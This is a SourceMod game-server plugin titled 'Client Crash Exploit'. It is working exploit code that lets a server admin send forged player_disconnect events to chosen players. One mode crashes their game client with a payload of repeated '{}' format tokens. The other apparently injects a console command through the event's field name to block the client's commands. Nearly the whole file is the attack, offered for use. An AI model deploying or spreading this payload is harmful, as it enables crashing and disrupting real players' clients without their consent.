#pragma semicolon 1
#pragma newdecls required

#include <sourcemod>

public Plugin myinfo =
{
	name = "Client Crash Exploit",
	author = "Reg1oxeN",
	description = "Крашит или блочит все команды клиента. Не работает на последней версии клиент мода.",
	version = "1.0",
	url = ""
};

public void OnPluginStart()
{
	RegAdminCmd("sm_sendexploit", SendExploit, ADMFLAG_ROOT, "");
}

public Action SendExploit(int client, int args) {
	if (args < 2)
	{
		ReplyToCommand(client, "[SM] Usage: sm_sendexploit <ExploitNum> <#userid|name>");
		ReplyToCommand(client, "[SM] ExploitNum: 1<Crash>, 2<BlockCmd>");
		return Plugin_Handled;
	}
	char arg[65], sExploitType[65];
	GetCmdArg(1, sExploitType, sizeof(sExploitType));
	ExploitType ET_Type = view_as<ExploitType>(StringToInt(sExploitType)-1);
	GetExploitTypeString(ET_Type, sExploitType, sizeof(sExploitType));
	if (sExploitType[0] == '\0')
	{
		ReplyToCommand(client, "[SM] UNKNOWN exploit type <%d>", view_as<int>(ET_Type)+1);
		return Plugin_Handled;
	}
	
	GetCmdArg(2, arg, sizeof(arg));

	char target_name[MAX_TARGET_LENGTH];
	int target_list[MAXPLAYERS], target_count;
	bool trash;
	
	if ((target_count = ProcessTargetString(arg,client,target_list,MAXPLAYERS,COMMAND_FILTER_NO_BOTS|COMMAND_FILTER_CONNECTED,target_name,sizeof(target_name),trash)) <= 0)
	{
		ReplyToTargetError(client, target_count);
		return Plugin_Handled;
	}

	for (int iTrget = 0; iTrget < target_count; iTrget++)
	{
		int iTarget = target_list[iTrget];
		ReplyToCommand(client, "[SendExploit] <%s> send to %N", sExploitType, iTarget);
		SendExploitToClient(iTarget, ET_Type);
	}
	return Plugin_Handled;
}

enum ExploitType 
{
	ET_Crash = 0,
	ET_BlockCmd,
	ET_Count
};
stock void GetExploitTypeString(ExploitType ET_type, char[] out_type, int size)
{
	switch (ET_type)
	{
		case ET_Crash:
		{
			strcopy(out_type, size, "Crash");
		}
		case ET_BlockCmd:
		{
			strcopy(out_type, size, "BlockCmd");
		}
		default:
		{
			out_type[0] = '\0';
		}
	}
}

stock void SendExploitToClient(int client, ExploitType ET_type)
{
	Event newEvent = CreateEvent("player_disconnect", true);
	newEvent.SetString("name", "Unconnected");
	newEvent.SetInt("index", 0);
	newEvent.SetInt("userid", 0);
	newEvent.SetString("networkid", "STEAM_0:0:1337");
	switch (ET_type)
	{
		case ET_Crash:
		{
			newEvent.SetString("reason", "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ? {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} ?{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}");
		}
		case ET_BlockCmd:
		{
			newEvent.SetString("reasonsay lol");
		}
	}
	newEvent.FireToClient(client);
	newEvent.Cancel();
}